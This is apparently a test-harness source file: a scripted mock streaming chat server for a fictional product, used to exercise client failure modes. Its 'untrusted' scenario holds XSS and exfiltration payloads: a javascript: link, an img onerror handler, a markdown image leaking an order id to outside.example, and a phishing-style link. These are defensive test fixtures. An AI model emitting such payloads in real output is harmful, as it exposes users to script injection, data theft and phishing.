// A scripted stand-in for a model behind a backend. No key, no network, and the
// same answer every run, so every failure mode can be produced on demand. All
// content is invented for the lab: Harbour is a fictional product.

import { createServer, type IncomingMessage, type Server, type ServerResponse } from "node:http";
import { readFile } from "node:fs/promises";

export const DOCS: Record<string, { title: string; passages: Record<string, string> }> = {
  refunds: {
    title: "Harbour help: refunds",
    passages: {
      window: "Annual plans can be refunded in full within 30 days of purchase.",
      monthly: "Monthly plans are not refunded, but they can be cancelled at any time.",
    },
  },
  exports: {
    title: "Harbour help: data export",
    passages: {
      format: "Workspace exports are delivered as a ZIP of CSV files.",
      limit: "An export link stays valid for 7 days.",
    },
  },
};

type Script = { steps: Step[]; after?: "end" | "destroy" | "hang" };
type Step =
  | { delta: string }
  | { citation: { id: number; title: string; url: string; quote: string } }
  | { done: { stop: "end" | "length" | "refusal"; evidence: "strong" | "weak" | "none" } }
  | { error: { type: string; retryable: boolean } }
  | { comment: string }
  | { wait: number } // silence from the model, keep-alive comments on the wire
  | { unknown: string };

const cite = (id: number, doc: string, passage: string) => ({
  citation: {
    id,
    title: DOCS[doc]!.title,
    url: `/docs/${doc}#${passage}`,
    quote: DOCS[doc]!.passages[passage]!,
  },
});

const words = (text: string): Step[] =>
  text.split(/(?<= )/).map((w) => ({ delta: w }));

const ANSWER = "Annual plans can be refunded in full within 30 days [1]. Monthly plans are not refunded, but you can cancel them at any time [2].";

const answer: Step[] = [
  { comment: "keep-alive" },
  cite(1, "refunds", "window"),
  cite(2, "refunds", "monthly"),
  cite(3, "exports", "limit"), // retrieved, but the answer never refers to it
  { unknown: "telemetry" }, // a newer event type this client has never heard of
  ...words(ANSWER),
  { done: { stop: "end", evidence: "strong" } },
];

const LONG = Array.from({ length: 60 }, (_, i) => `Paragraph ${i + 1} of a long answer about plans [1].\n\n`).join("");

const SCRIPTS: Record<string, Script> = {
  answer: { steps: answer },
  "slow-start": { steps: [{ wait: 1500 }, ...answer] },
  long: {
    steps: [cite(1, "refunds", "window"), ...LONG.split(/(?<=\n\n)/).map((delta) => ({ delta })), { done: { stop: "end", evidence: "strong" } }],
  },
  uncertain: {
    steps: [
      cite(1, "exports", "limit"),
      ...words("An export link appears to stay valid for 7 days [1], but the passage found does not mention shared workspaces."),
      { done: { stop: "end", evidence: "weak" } },
    ],
  },
  "no-evidence": {
    steps: [
      ...words("The help centre has no passage about this."),
      { done: { stop: "end", evidence: "none" } },
    ],
  },
  "dangling-citation": {
    steps: [
      cite(1, "refunds", "window"),
      ...words("Annual plans can be refunded within 30 days [1]. Refunds arrive in 2 days [4]."),
      { done: { stop: "end", evidence: "strong" } },
    ],
  },
  truncated: {
    steps: [
      cite(1, "refunds", "window"),
      ...words("Annual plans can be refunded in full within 30 days [1]. For monthly plans the"),
      { done: { stop: "length", evidence: "strong" } },
    ],
  },
  refusal: {
    steps: [
      ...words("This assistant cannot give legal advice about your contract."),
      { done: { stop: "refusal", evidence: "none" } },
    ],
  },
  "mid-stream-error": {
    steps: [
      cite(1, "refunds", "window"),
      ...words("Annual plans can be refunded in full"),
      { error: { type: "overloaded_error", retryable: true } },
    ],
  },
  dropped: {
    steps: [cite(1, "refunds", "window"), ...words("Annual plans can be refunded")],
    after: "destroy",
  },
  "clean-eof": {
    steps: [cite(1, "refunds", "window"), ...words("Annual plans can be refunded")],
    after: "end",
  },
  stalled: { steps: words("Annual plans can be"), after: "hang" },
  untrusted: {
    steps: [
      { citation: { id: 1, title: "Harbour help: refunds", url: "/docs/refunds#window", quote: DOCS.refunds!.passages.window! } },
      { citation: { id: 2, title: "Click to verify", url: "javascript:window.__pwned=1", quote: "This text arrived from a retrieved page." } },
      ...words(`Annual plans can be refunded [1]. <img src="x" onerror="window.__pwned=1"> ![status](https://outside.example/p.png?d=order-118) [click here](https://outside.example/login) See [2]. https://outside.example/${"a".repeat(180)} `),
      { done: { stop: "end", evidence: "strong" } },
    ],
  },
  "handoff-down": {
    steps: [...words("The help centre has no passage about this."), { done: { stop: "end", evidence: "none" } }],
  },
};

export const SCENARIOS = [
  "answer",
  "slow-start",
  "long",
  "uncertain",
  "no-evidence",
  "dangling-citation",
  "truncated",
  "refusal",
  "busy-once",
  "busy-always",
  "proxy-login-page",
  "server-error",
  "mid-stream-error",
  "dropped",
  "clean-eof",
  "stalled",
  "untrusted",
  "handoff-down",
] as const;

export type Stats = {
  streams: number;
  lastDeltasWritten: number;
  lastClientGone: boolean;
  handoffs: unknown[];
};

export type MockOptions = { publicDir: string; appJs: string; tickMs?: number };

const CSP =
  "default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self'; " +
  "connect-src 'self'; base-uri 'none'; form-action 'self'; frame-ancestors 'none'";

function sendJson(res: ServerResponse, status: number, body: unknown, headers = {}): void {
  res.writeHead(status, { "content-type": "application/json", ...headers });
  res.end(JSON.stringify(body));
}

async function readBody(req: IncomingMessage, limit = 64 * 1024): Promise<string | null> {
  let size = 0;
  const parts: Buffer[] = [];
  for await (const part of req) {
    size += (part as Buffer).length;
    if (size > limit) return null;
    parts.push(part as Buffer);
  }
  return Buffer.concat(parts).toString("utf8");
}

function escapeHtml(s: string): string {
  return s.replace(/[&<>"']/g, (c) => `&#${c.charCodeAt(0)};`);
}

const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));

export function createMockServer(opts: MockOptions): { server: Server; stats: Stats } {
  const tickMs = opts.tickMs ?? 40;
  const stats: Stats = { streams: 0, lastDeltasWritten: 0, lastClientGone: false, handoffs: [] };
  const busySeen = new Set<string>();
  let nextTicket = 1001;

  async function stream(req: IncomingMessage, res: ServerResponse, script: Script): Promise<void> {
    stats.streams++;
    stats.lastDeltasWritten = 0;
    stats.lastClientGone = false;
    let gone = false;
    res.on("close", () => {
      if (!res.writableFinished) {
        gone = true;
        stats.lastClientGone = true;
      }
    });
    res.writeHead(200, {
      "content-type": "text/event-stream; charset=utf-8",
      "cache-control": "no-cache",
      "x-accel-buffering": "no", // ask a buffering reverse proxy to pass bytes through
    });
    const send = (name: string, data: unknown) =>
      res.write(`event: ${name}\ndata: ${JSON.stringify(data)}\n\n`);

    for (const step of script.steps) {
      if (gone) return; // the client left: stop producing, which is what saves money
      await sleep(tickMs);
      if (gone) return;
      if ("delta" in step) {
        send("delta", { text: step.delta });
        stats.lastDeltasWritten++;
      } else if ("citation" in step) send("citation", step.citation);
      else if ("done" in step) send("done", step.done);
      else if ("error" in step) send("error", step.error);
      else if ("comment" in step) res.write(`: ${step.comment}\n\n`);
      else if ("wait" in step) {
        for (let waited = 0; waited < step.wait && !gone; waited += 200) {
          res.write(": keep-alive\n\n");
          await sleep(200);
        }
      }
      else send(step.unknown, { note: "a client that does not know this event must ignore it" });
    }
    if (script.after === "destroy") res.destroy();
    else if (script.after === "hang") return;
    else res.end();
  }

  const server = createServer(async (req, res) => {
    const url = new URL(req.url ?? "/", "http://mock.invalid");
    res.setHeader("content-security-policy", CSP);
    try {
      if (req.method === "POST" && url.pathname === "/api/chat") {
        const raw = await readBody(req);
        if (raw === null) return sendJson(res, 413, { error: { type: "too_large" } });
        let body: { question?: unknown; scenario?: unknown };
        try {
          body = JSON.parse(raw);
        } catch {
          return sendJson(res, 400, { error: { type: "bad_json" } });
        }
        const question = typeof body.question === "string" ? body.question.trim() : "";
        if (!question) return sendJson(res, 400, { error: { type: "empty_question" } });
        const scenario = typeof body.scenario === "string" ? body.scenario : "answer";

        if (scenario === "server-error")
          return sendJson(res, 500, { error: { type: "internal" } });
        if (scenario === "busy-always")
          return sendJson(res, 503, { error: { type: "overloaded" } }, { "retry-after": "30" });
        if (scenario === "busy-once") {
          if (!busySeen.has(question)) {
            busySeen.add(question);
            return sendJson(res, 503, { error: { type: "overloaded" } }, { "retry-after": "2" });
          }
          return stream(req, res, SCRIPTS.answer!);
        }
        if (scenario === "proxy-login-page") {
          res.writeHead(200, { "content-type": "text/html" });
          return void res.end("<!doctype html><title>Sign in</title><h1>Corporate proxy sign-in</h1>");
        }
        const script = SCRIPTS[scenario];
        if (!script) return sendJson(res, 400, { error: { type: "unknown_scenario" } });
        return stream(req, res, script);
      }

      if (req.method === "POST" && url.pathname === "/api/handoff") {
        const raw = await readBody(req);
        const body = JSON.parse(raw ?? "{}") as { scenario?: string };
        if (body.scenario === "handoff-down") return sendJson(res, 503, { error: { type: "queue_down" } });
        stats.handoffs.push(body);
        return sendJson(res, 200, { ticket: `H-${nextTicket++}` });
      }

      if (req.method === "GET" && url.pathname.startsWith("/docs/")) {
        const doc = DOCS[url.pathname.slice("/docs/".length)];
        if (!doc) return sendJson(res, 404, { error: { type: "not_found" } });
        const paragraphs = Object.entries(doc.passages)
          .map(([id, text]) => `<p id="${id}">${escapeHtml(text)}</p>`)
          .join("\n");
        res.writeHead(200, { "content-type": "text/html; charset=utf-8" });
        return void res.end(
          `<!doctype html><html lang="en"><title>${escapeHtml(doc.title)}</title><main><h1>${escapeHtml(doc.title)}</h1>\n${paragraphs}</main></html>`,
        );
      }

      if (req.method === "GET" && url.pathname === "/app.js") {
        res.writeHead(200, { "content-type": "text/javascript; charset=utf-8" });
        return void res.end(await readFile(opts.appJs));
      }
      if (req.method === "GET" && url.pathname === "/style.css") {
        res.writeHead(200, { "content-type": "text/css; charset=utf-8" });
        return void res.end(await readFile(`${opts.publicDir}/style.css`));
      }
      if (req.method === "GET" && url.pathname === "/") {
        res.writeHead(200, { "content-type": "text/html; charset=utf-8" });
        return void res.end(await readFile(`${opts.publicDir}/index.html`));
      }
      sendJson(res, 404, { error: { type: "not_found" } });
    } catch (err) {
      if (!res.headersSent) sendJson(res, 500, { error: { type: "internal", detail: String(err) } });
      else res.destroy();
    }
  });
  return { server, stats };
}
